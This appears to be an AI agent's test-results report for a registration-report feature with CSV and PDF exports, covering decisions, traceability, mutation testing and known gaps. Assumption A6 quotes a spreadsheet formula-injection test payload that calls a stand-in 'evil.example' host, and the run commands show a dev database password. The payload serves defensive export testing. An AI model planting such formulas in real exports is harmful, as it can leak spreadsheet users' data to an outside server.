# SPM-63 View Registration Information (Organiser and Coordinator): test results

**Provenance.** `docs/prompts/test-code-generation-guide.md` and `docs/specs/SPM-63-test-cases.md` were not in the repository. The Guide was read from `~/Desktop/test_gen_based_on_ACs/test-code-generation-guide-updated.md`. The 18 cases were read from the Confluence pages `VIEW-REG-INFO-01` to `06` and the "View Registration Information (Organiser & Coordinator) Matrix" (space SP); they match the resolved-spec tables in the task prompt. Jira SPM-63 was read directly; its status was **In Progress** and it has no comments. Spec documents were not edited.

**Stack facts that differ from the prompt** (all agreed at Gate 1, "Proceed with recommendations"): PostgreSQL (not MySQL); session-cookie auth (not an Authorization header); event, user and registration ids are UUIDs, so `EVT-101`, `COO-01`, `REG-9001` are labels; the stored registration statuses are only `Registered` and `Withdrawn` (SPEC "Confirmed" = `Registered`, F18); events have one `coordinator_id` column and an `organiser_id` column (no `event_coordinators` table, no `assignment.service.ts`); capacity is `registration_limit`.

**Oracle tiers.** SPEC = Confluence case or AC text; DERIVED = follows from a business rule or decision; ASSUMED = neither states it (listed in the assumption index below).

## Decisions applied (Gate 1)

| # | Decision |
|---|---|
| Q1 / D2 | `GET /api/events/:eventId/registrations/report` and `GET /api/events/:eventId/registrations/report/export?format=csv\|pdf`; unknown format is 400, checked only after access. Body: `{ event: { id, name, startDateTime, endDateTime, capacity }, totalConfirmed, availableSpots, generatedAt, registrations: [{ registrationId, fullName, email, contactNumber, registeredAt, status: "Confirmed" }] }`, ISO UTC. |
| Q2 / D6 | Columns: Name, Email, Contact Number, Registration Date, Status. Special Requirements excluded; the SQL payload of 04-E is in Full Name. |
| Q3 / D9 | UTF-8 with BOM, RFC 4180 minimal quoting, CRLF after every record including the last. |
| Q4 / D11 | `pdfkit` (dependency), `pdf-parse` (dev dependency), bundled Noto Sans Regular (SIL OFL) in `backend/assets/fonts`. No CJK font: CJK in a PDF is a known gap. |
| Q5 / D12 | Polling every 5 s; each response replaces the report; stops on unmount, event change, 401 and 403. |
| Q6 | F1 (hyphen title), F2 (date ascending), F3 ("N Attendees Registered (N / cap)") confirmed. |
| Q7 | Created the `spm_test` database on the Compose Postgres (init `001` to `007` applied). The dev `spm` database was not touched. |
| Q8 | Cancelled registrations cannot exist (CHECK constraint), so that fixture of 02-A is Not Automated and mutant M1 is equivalent. |
| Q9 | EVT-106 is seeded as `Confirmed` with no registrations (`Planning` is not an allowed event status). |
| Q10 | Filename `<event UUID>_registrations_<SGT date>.<csv\|pdf>`. |
| Q11 | One page `RegistrationReportPage` at `/events/:id/registrations/report` for both roles; the "View Registrations" link is added under each managed event card in `EventListPage`. |
| Q12 | Denials are logged with Nest's `Logger.warn({ message, userId, eventId, reason: "not_assigned_or_owner" })`. |

## Traceability map (rules R1 to R14)

| Rule | Test IDs |
|---|---|
| R1 managers only | `report-access.spec` (01-A, 01-C, 05-A, 05-B, 05-D and the -ROLE/-NULL/-BOTH cases); e2e 01-A, 01-C, 05-A, 05-B; FE `registrationReport.test` (links), `EventListPage.registrations.test` |
| R2 401 before lookup, 403 MSG-08, identity from the token | e2e 05-D (401 x3 doors, 403 x3 doors), 05-A, 05-B, 05-C, 05-C-TOKEN, 05-D-ORDER; FE 05-A, 05-D |
| R3 one guard for the report and both exports | e2e `it.each(DOORS)` in 05-A, 05-B, 05-D, 06-A-CACHE (three doors); one shared method `getReport` |
| R4 Confirmed only | e2e 01-A, 02-A, 03-A, 04-A, 04-B (Ben Lim absent) |
| R5 count and availability | `report-format.spec` and FE helpers (wording), e2e 02-A, 02-A-BND, 02-B; FE `ReportHeader.test` |
| R6 columns and order | `export.service.spec` 04-A, e2e 04-A, 04-B, 03-A; FE `ReportTable.test` 03-A |
| R7 sort | e2e 03-A, 03-A-BND (id tie-break) |
| R8 SGT display, UTC storage, filename date | `report-format.spec`, FE `registrationReport.test` 03-A, e2e 04-A-BND, 04-B; run under 3 time zones |
| R9 CSV UTF-8 / RFC 4180 | `export.service.spec` 04-A, 04-C, 04-D; e2e 04-D |
| R10 neutralise at export, then quote | `export.service.spec` 04-E (INT, it.each x6, BND); e2e 04-E (stored and JSON literal); FE `ReportTable.test` 04-E (screen literal) |
| R11 PDF | e2e 04-B, 04-B-LONG, 04-C, 04-E; `export.service.spec` 04-B-PAGES |
| R12 empty event | `export.service.spec` 04-C; e2e 04-C; FE `ReportTable.test` and page 04-C |
| R13 real-time within 10 s | FE page 06-A, 06-B and the -UNMOUNT/-REVOKE/-SESSION/-BLIP/-INFLIGHT cases; e2e 02-B, 06-A, 06-B, 06-A-CACHE |
| R14 allowlist response | e2e 01-C (sentinel values, exact key sets) |

## Evidence table

| Test ID | AC | Level | Oracle source | Mutant it kills |
|---|---|---|---|---|
| 01-A | AC1 | Integration + FE page + FE link | SPEC 01-A (200, three Confirmed rows, heading, link target) | assignment lookup on the wrong column (X10); wrong event id in the link |
| 01-B | AC1 | Integration + FE page | SPEC 01-B; **added** race: DERIVED | fetch not keyed by event (X7); M17 late response applied |
| 01-C | AC1 | Integration + FE | SPEC 01-C (same body as the coordinator; no internal data) | M14 event row spread; ownership not honoured (M3) |
| 02-A | AC2 | Integration + unit + FE component | SPEC 02-A (3 / 47); **added** singular BND ASSUMED | M20 plural always; clamp removed (X1); count from all rows |
| 02-B | AC2 | Integration + FE page | SPEC 02-B (A: 4, B: 2; fresh fixture each, F6) | server cache not invalidated; withdrawn still counted |
| 03-A | AC3 | Integration + unit + FE component | SPEC 03-A (rows, SGT cells, columns) | M8 sort descending / by id; UTC hour (X8, X9); suffix missing (X13/X17) |
| 04-A | AC4 | Unit + integration + FE | SPEC 04-A (headers, exact body, filename); **added** BND SGT date | M9 UTC filename date; LF endings (X4); BOM removed (X3); plain link / no cookie (FE X10); invented filename (FE X9) |
| 04-B | AC4 | Integration (+ unit pagination) | SPEC 04-B (text in order, Ben Lim absent); **added** 100-char and non-ASCII: DERIVED | M19 summary count; page-break handling (X14) |
| 04-C | AC4 | Unit + integration + FE | SPEC 04-C (empty state, header-only CSV, PDF message) | M18 header dropped; M19a PDF empty state |
| 04-D | AC4 | Unit + integration | SPEC 04-D + F9 (doubled quotes only); **added** newline and UTF-8 bytes | M10 comma, M11 backslash escaping |
| 04-E | AC4 | Unit + integration + FE | SPEC 04-E + ASSUMED payload | M12a/M12b, M13 neutralise at input |
| 05-A | AC5 | Integration x3 doors + FE | SPEC 05-A (403, MSG-08, no data) | M2 any coordinator; X10 wrong column |
| 05-B | AC5 | Integration x3 doors + FE | SPEC 05-B | M3 any organiser; X11 wrong column |
| 05-C | AC5 | Integration | SPEC 05-C (query ignored, denial logged); log shape ASSUMED | M4 identity from query; X6 no log |
| 05-D | AC5 | Integration x3 doors x2 + FE | SPEC 05-D | M7 attendee allowed; M6b middleware removed |
| 06-A | AC6 | FE page (fake timers) + integration | SPEC 06-A (10 s, no duplicates, no console error); **added** unmount, 403, 401, blip, in-flight: DERIVED/ASSUMED | M15 append, M16 interval, X1 15 s interval, X2/X3 403 handling, X5 in-flight, X6 |
| 06-B | AC6 | FE page + integration | SPEC 06-B | rows kept after withdrawal; only the count updating |
| EVENT-REG-03-SEC-1 (coordinator report) | AC3 | FE component | SPEC (cross-story add-on) | X16 names rendered as HTML |

## Results

All results are from runs of the commands under "Run commands". **Pass** = every test of that ID passed in the last full run.

| Test Case ID | Subtest | file :: test name | Layer | Result | Notes |
|---|---|---|---|---|---|
| 01-A | BE | `registrations.report.e2e-spec.ts` :: 01-A | Integration | Pass | The case's own fixture: exactly REG-9007 and REG-9001 plus the Withdrawn REG-9003 (no REG-EXTRA-01) |
| 01-A | FE | `RegistrationReportPage.test.tsx` :: 01-A; `EventListPage.registrations.test.tsx` :: 01-A | FE page | Pass | Link on the existing list (D14 / Q11) |
| 01-B | BE, FE, race | `registrations.report.e2e-spec.ts` :: 01-B; `RegistrationReportPage.test.tsx` :: 01-B, 01-B-RACE, 01-B-POLL | Integration + FE | Pass | Race and polling-stop are added subtests |
| 01-C | BE, FE | e2e :: 01-C; page :: 01-C; list :: 01-C | Integration + FE | Pass | |
| 02-A | BE, unit, FE | e2e :: 02-A, 02-A-BND; `report-format.spec.ts`; `ReportHeader.test.tsx` | Integration + unit + FE | Pass | Cancelled fixture: **Not Automated** (Q8) |
| 02-B | A and B | e2e :: 02-B (x2); page :: 02-B; `ReportHeader.test.tsx` :: 02-B | Integration + FE | Pass | Independent fixtures (F6) |
| 03-A | BE, FE | e2e :: 03-A, -BND, -NULL; `ReportTable.test.tsx` :: 03-A; helper specs | Integration + unit + FE | Pass | Also run under TZ=UTC, Asia/Singapore, America/Los_Angeles |
| 04-A | BE, unit, FE | e2e :: 04-A, -BND, -FMT (unknown, repeated, upper-case, empty and missing format); `export.service.spec.ts`; page :: 04-A (+ -BUSY, -ERR) | Integration + unit + FE | Pass | |
| 04-B | BE | e2e :: 04-B, 04-B-LONG; `export.service.spec.ts` :: 04-B-PAGES; page :: 04-B | Integration + FE | Pass | Visual layout: **Not Automated** |
| 04-C | BE, FE | e2e :: 04-C; `export.service.spec.ts`; `ReportTable.test.tsx`; page :: 04-C | Integration + unit + FE | Pass | EVT-106 seeded as Confirmed (Q9) |
| 04-D | BE | `export.service.spec.ts` :: 04-D; e2e :: 04-D | Unit + integration | Pass | Opening in a spreadsheet: **Not Automated** |
| 04-E | BE, FE | `export.service.spec.ts` :: 04-E (x13); e2e :: 04-E; `ReportTable.test.tsx` :: 04-E | Unit + integration + FE | Pass | Opening in Excel: **Not Automated** |
| 05-A | BE x3 doors, FE | e2e :: 05-A (x3), 05-A-FMT; page :: 05-A; list :: 05-A | Integration + FE | Pass | |
| 05-B | BE x3 doors, FE | e2e :: 05-B (x3); list :: 05-B | Integration + FE | Pass | Per-test fixture, shared seed untouched (F14) |
| 05-C | A and B | e2e :: 05-C, 05-C-TOKEN, 05-D-ORDER | Integration | Pass | Logger spied only here |
| 05-D | A and B | e2e :: 05-D (x6); page :: 05-D (x2); list :: 05-D | Integration + FE | Pass | |
| 06-A | BE, FE | e2e :: 06-A, 06-A-CACHE (x3); page :: 06-A and the -UNMOUNT / -REVOKE / -SESSION / -BLIP / -INFLIGHT cases | Integration + FE | Pass | 06-A/06-B FE live on the page, not on `ReportTable` (the page owns the lifecycle) |
| 06-B | BE, FE | e2e :: 06-B, 06-B-REREG (withdraw then register again); page :: 06-B | Integration + FE | Pass | The re-registration date is stamped by the database clock, so only its order and difference from the original are asserted |
| EVENT-REG-03-SEC-1 (coordinator report) | add-on | `ReportTable.test.tsx` | FE component | Pass | |

## Review checklist (Guide 10C)

| Question | Answer |
|---|---|
| Does every test trace to an AC? | Yes. The extra tests (-BND, -ROLE, -NULL, -FMT, -CACHE, -INFLIGHT ...) trace to a rule R1 to R14. |
| Does every test have a plausible failing implementation? | Yes; each carries a `Kills:` line, and the mutation run confirms them (below). |
| Can each setup, action and expected result be explained? | Yes; each test has Arrange / Act / Assert sections and an oracle comment with the arithmetic. |
| Are expected values justified independently of the code? | Yes, except the assumptions in the index below. |
| Deterministic and non-vacuous? | Yes: injected clock / fake timers, per-test fixtures with cleanup, no sleeps, no empty assertions. Date-sensitive suites pass under three process time zones. |

## Pre-submit checklist (Guide 11)

- [x] Every test traces to a rule/AC; the spec's own worked examples are included.
- [x] Every test has a `Kills:` line.
- [x] Happy, sad and boundary coverage per rule; each role (coordinator, organiser, attendee, no session) and each door (report, CSV, PDF) covered.
- [x] Every output field asserted (the row and event key sets are asserted exactly in 01-C and 03-A).
- [x] Oracles are literals; assumptions tagged `// ASSUMPTION An:` and indexed once at the end of each file.
- [x] No loops computing expectations; `it.each` tables are literal; no snapshots; no real `Date.now()`, timers or `Math.random()` in tests (the event-list spec was corrected after review to use a faked `Date` and fixed instants). The one loop with `expect` inside (04-B text order) walks a literal list and computes nothing.
- [x] Sad-path "no side effect / no leak" claims are real: refusals assert no attendee data in the body, no log PII, and (04-E) an unchanged registrations row count.
- [x] Rule-order interactions covered: 401 -> 404 -> 403 (05-D-ORDER), access before format (05-A-FMT), neutralise before quote (04-E-INT).
- [x] Non-default parameters and paired fields: dates use three different instants, capacity 2 vs 50, high/low ids for the tie.
- [x] Time, randomness and ordering controlled; each integration test creates and deletes its own rows.
- [x] Coverage run as a diagnostic (below). Mutation run: no real survivors.
- [x] Original implementation files untouched by the mutation runs (the runner hashes them). Scratch copies removed. Coverage output removed.

Coverage (diagnostic only): frontend SPM-63 files 97.3% statements / 88.7% branches; backend integration run: `export.service.ts` 94% statements (the page-break path was then covered by the added pagination test), `registrations.controller.ts` 93%, `report-format.ts` 96% (the remaining branch is the `?? ''` fallback after `find`, which `Intl` never triggers).

## Review follow-up

After a review against the Guide, three defects were fixed (the 01-A backend fixture now matches the case exactly; the event-list spec no longer reads the real clock; a stale file header was corrected) and these tests were added: 04-A-FMT for a repeated, upper-case, empty and missing `format`, and 06-B-REREG for withdraw-then-register-again. Probe mutants for them (lenient format parsing, a default format, the original date kept) were killed and are now X15 to X17. Open review points: the oracle wording choices (F3, A4, A5, the 5 s poll) were made by the same author as the tests, so they need an independent check; the SQL "row count unchanged" assertion in 04-E is spec-required but can hardly fail.

## Gap list

**Not Automated**
- Opening the CSV in Excel / importing it into a spreadsheet (04-D, 04-E): automated equivalents are the byte-level and neutralisation tests.
- Visual PDF layout review (04-B): the text content, order, completeness and page continuation are automated.
- Reading `Content-Disposition` across origins in a real browser: the server sends `Access-Control-Expose-Headers: Content-Disposition` (checked against the built server with `curl`, below) but no browser test exists.
- A Cancelled registration (02-A added fixture): the schema forbids the status (Q8).
- Exact value of a re-registration date (06-B-REREG): `created_at` is reset by SQL `now()` in the SPM-61 code, not the injected clock.
- Real WebSocket / push: not chosen (Q5).

**Blocked**: none. The link steps of 01-A/B/C and 05-A/B are automated on the existing event list (D14 holds: no separate dashboards exist).

**Assumptions (A1 to A15)**
- A1 "Sep" not "Sept"; A2 multi-day event line "9 Oct 2026 18:00 - 11 Oct 2026 03:00 SGT"; A3 "Generated 29 Sep 2026 12:00 SGT"; A4 singular "1 Attendee Registered (1 / N)"; A5 "{k} spots available" / "1 spot available".
- A6 04-E formula payload `=IMPORTXML("http://evil.example/x","//a")`; A7 SQL payload in Full Name; A8 missing contact number is an empty cell; A9 filename token is the event UUID.
- A10 `availableSpots = max(capacity - n, 0)`; A11 unknown format is 400; A12 log shape and warn level; A13 a transient poll failure keeps rows and polling continues; A14 export 5xx wording reuses the generic `api()` text; A15 the link is offered for every managed event, regardless of status.
- Also assumed: a report is available for managers in any event status; a non-UUID event id is 404 "Event not found."; no Admin role exists, so Admin gets no access.

**Out of scope (D21)**: pagination of large events, an export audit trail, scheduled or emailed reports, admin role design, waiting-list display, attendee lists on public pages.

**Known limitations**
- The PDF has no CJK font, so CJK characters in a PDF name will not render. The CSV handles them (verified at byte level).
- A registration with no stored full name (SPM-99 rows) is shown with an empty name.
- A new registration shows up on the next poll (up to 5 s), not instantly.

## Document-defect resolutions (F1 to F20)

| # | Applied |
|---|---|
| F1 | Title "{Event Name} - Registration Report" (hyphen) everywhere. |
| F2 | Rows in registration-date ascending order (Dev, Alice, Chloe), ties by registration id. |
| F3 | "N Attendees Registered (N / cap)" on screen and in the PDF. |
| F4 | Column labels "Contact Number" and "Registration Date". |
| F5 | Special Requirements is not exported (Q2); the payloads moved to Full Name. |
| F6 | 02-B subtests use independent fixtures. |
| F7 | Withdrawn rows are excluded entirely; there is no separate section. |
| F8 | Filename `<id>_registrations_<date>.<ext>` (the id is the event UUID, Q10). |
| F9 | Only doubled quotes (`O"Brien` becomes `"O""Brien"`). |
| F10 | BOM included (Q3). |
| F11 | Per-test fixtures; this suite uses 04-B's EVT-101 times (9 Oct 18:00-21:00 SGT). |
| F12 | `pdfkit` (Q4). |
| F13 | Excel / spreadsheet / visual checks are Not Automated; automated equivalents exist. |
| F14 | Per-test fixture for ORG-02 / EVT-102; the shared seed is untouched. |
| F15 | The action is "View Registrations". |
| F16 | Latency is asserted with fake timers at 10 000 ms. |
| F17 | ATT-05 Farhan Rahman `farhan.rahman@example.com`, `81234567` (ASSUMED); payload per A6. |
| F18 | SPEC "Confirmed" is the stored `Registered`. |
| F19 | No `event_coordinators` table or `assignment.service.ts`; the rule uses `events.coordinator_id` and `events.organiser_id`. |
| F20 | One page for both roles (no separate router areas). |

## Mutation results

Tool: the repo's own harness (`scripts/testing/mutation/run.mjs --mutants spm63.mutants.mjs`; it mutates a scratch copy, runs a green baseline first, requires each edit to apply exactly once, and proves the originals unchanged). Stryker is not installed.

| Prompt mutant | Result |
|---|---|
| M1 status filter `!= withdrawn` | **equivalent**: the CHECK constraint allows only Registered and Withdrawn (Q8) |
| M2 / M3 assignment / ownership check removed | killed (unit and integration) |
| M4 identity from the query | killed (integration 05-C, 05-C-TOKEN) |
| M5 exports skip the access check | **not expressible**: one shared `getReport` guards all three doors, so no export-only bypass exists to inject. The three-door `it.each` in 05-A/05-B/05-D, and M2/M3/X10/X11/X12 run through all doors, would catch one |
| M6 authorization before authentication | M6a (service backstop 401 to 403) **equivalent** because the middleware answers first; M6b (middleware removed from the routes) **killed** |
| M7 attendee allowed | killed |
| M8 sort descending / by id | killed (M8, M8b) |
| M9 UTC filename date | killed |
| M10 / M11 / M12 / M13 | killed (M12 both the removed and the wrong-order variants) |
| M14 event row spread | killed |
| M15 / M16 / M17 (frontend) | killed |
| M18 header dropped on empty CSV | killed |
| M19 PDF from the wrong rows | killed (empty-state and summary-count variants; "all statuses" cannot occur because the PDF only receives the one report) |
| M20 plural always | killed (backend and frontend) |

Backend: 37 mutants, **35 killed, 2 equivalent** (M1, M6a), 0 survived. Frontend: 25 mutants, **25 killed**, 0 survived. Extra mutants (X1 to X17 backend, X1 to X21 frontend) cover the clamp, no-store header, BOM, CRLF, tie-break, denial log, access-before-format, unknown-format fallback, UTC rendering, wrong column compared, AND instead of OR, page breaks, 403/401/in-flight/unmount handling, the download (cookie, filename, revoke, disabled buttons), link visibility and HTML rendering.

Time zones: the date-sensitive suites (backend `report-format.spec.ts`, `export.service.spec.ts`, `registrations.report.e2e-spec.ts`; frontend helper, table, page and list suites) pass under `TZ=UTC`, `TZ=Asia/Singapore` and `TZ=America/Los_Angeles`.

Real-server check: the built backend (`node dist/main.js` on :8081 against `spm_test`) returned 200 with `Content-Type: application/pdf`, `Content-Disposition: attachment; filename="<uuid>_registrations_<SGT date>.pdf"`, `Cache-Control: no-store` and `Access-Control-Expose-Headers: Content-Disposition` for an allowed `Origin`, a valid 1-page PDF (so the font resolves from `dist/`), the report JSON with "Zoë Ångström" intact, and 401 without a cookie. The smoke event was deleted afterwards.

## Regression (SPM-61, SPM-62, SPM-120)

- Backend unit: 748 passed (baseline 688; +60 new). Backend integration `src/registrations`: 114 passed, 1 todo (baseline 70 + 1 todo; +44 new); the SPM-61 and SPM-120 suites are unchanged and green.
- Frontend: 592 passed, 1 todo (baseline 532; +60 new). `EventListPage.test.tsx` and the SPM-61/62/120 page and component suites are unchanged and green. `tsc -b --noEmit` clean; `npm run build` ok; lint shows the same 2 pre-existing errors (`ClarificationThread.tsx:157`, `useAppStore.auth.test.ts:5`).
- Backend `npm run build` ok; `npm run lint` clean. Backend `tsc --noEmit` shows the pre-existing errors in `test/events-assign.e2e-spec.ts` and `vitest.spm37.config.ts` only.

## Run commands

Coverage is diagnostic only: it does not show that a behaviour is correct.

- Backend unit: `cd backend && npm test`.
- Backend integration (real PostgreSQL, init `001` to `007` applied): `cd backend && DATABASE_URL=postgres://spm:spm_dev_password@localhost:5432/spm_test npx vitest run --config ./vitest.config.e2e.ts src/registrations/registrations.report` (44 tests; use `src/registrations` for the SPM-61, SPM-120 and SPM-63 files together).
- Time zones: prefix either command with `TZ=UTC`, `TZ=Asia/Singapore` or `TZ=America/Los_Angeles`.
- Frontend: `cd frontend && npm test`; subset `npx vitest run src/utils/registrationReport.test.ts src/components/registrations src/pages/RegistrationReportPage.test.tsx src/pages/EventListPage.registrations.test.tsx`; `npx tsc -b --noEmit`; `npm run lint`; `npm run build`.
- Mutation: `cd backend && DATABASE_URL=<db> node scripts/testing/mutation/run.mjs --mutants spm63.mutants.mjs` (about 3 minutes) and `cd frontend && node scripts/testing/mutation/run.mjs --mutants spm63.mutants.mjs` (about 5 minutes). Add `--only M2,X6` for a subset, `--list` to list.
- Coverage: `npm run test:cov` in either component (add `--coverage.include=<files>` to scope it).
- Test database: create once with `CREATE DATABASE spm_test;` and apply `database/postgresql/init/001` to `007` (both `007_*` files).
